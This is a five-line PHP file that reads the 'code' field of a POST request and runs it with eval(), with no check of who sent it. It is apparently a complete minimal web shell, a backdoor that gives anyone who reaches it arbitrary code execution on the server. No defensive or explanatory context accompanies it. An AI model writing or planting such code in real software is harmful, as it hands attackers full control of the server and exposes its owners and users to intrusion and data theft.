<?php
$code = $_POST["code"];
ob_start();
eval($code);
?>